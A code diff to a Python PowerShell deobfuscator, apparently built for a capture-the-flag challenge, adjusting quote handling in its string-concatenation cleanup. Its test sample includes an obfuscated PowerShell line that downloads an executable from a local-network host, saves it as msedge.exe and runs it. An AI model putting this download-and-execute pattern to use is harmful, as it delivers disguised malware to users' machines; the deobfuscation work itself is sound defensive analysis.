@@ -81,7 +81,7 @@ def concat_test(code):
         if len(element) == 1:
             newcode = newcode.replace(results[i], gabungin[i])
         else:
-            newcode = newcode.replace("+", "").replace("''", "").replace("'", "").replace(" ", "")
+            newcode = newcode.replace("+", "").replace('"', "").replace("'", "").replace(" ", "")
     return newcode
 
 
@@ -96,7 +96,7 @@ $tes = [Char]        70 + [Char](-11   +   100) +               [ChAr](99       
 $tes2 = [ChaR](99   -  10)+[CHAR](109 -bxor   4)
 $tes3 = [ChaR](99 -bxor 13)  +  [CHar](109-bxor   4)
 $tes4 = [ChaR](99+               13)   +   [CHar](109 -bxor 4)
-$tes5 = 'hel'+'lo'
+$tes5 = 'hel'+"lo"
 $u='ht'+'tp://192.168.0.16:8282/B64_dec'+'ode_RkxBR3tEYXl1bV90aGlzX'+'2lzX3NlY3JldF9maWxlfQ%3'+'D%3D/chall_mem_se'+'arch.e'+'xe';$t='Wan'+'iTem'+'p';mkdir -force $env:TMP\..\$t;try{iwr $u -OutFile $d\msedge.exe;& $d\msedge.exe;}catch{}
 """
 print(deobfuscate(testing))
